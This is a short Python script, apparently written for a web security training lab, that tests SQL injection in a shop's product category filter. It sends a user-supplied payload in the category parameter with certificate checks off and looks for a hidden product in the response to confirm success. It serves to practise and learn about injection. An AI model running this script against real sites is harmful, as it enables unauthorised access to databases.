### This lab contains SQL injection vulnerability in the product category filter.

#Backend Query:

# SELECT * FROM products WHERE category = 'Gifts' AND released =1;


    
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def exploit_sql(url,payload):
    uri='/filter?category='
    response=requests.get(url+uri+payload,verify=False)
    if "Eye Projectors" in response.text:
        return True
    
    return False
    
    
if __name__=="__main__":
    try:
        url=input("please enter url : ")
        payload=input("please enter payload : " )
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]}<url> <payload>")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1' ")
        sys.exit(-1)
        
        
    if exploit_sql(url,payload)==True:
        print(f'[+] SQL injection successful ')
        
   
    else:
        print(f"[-] SQL Injectin Unsuccessful")
        
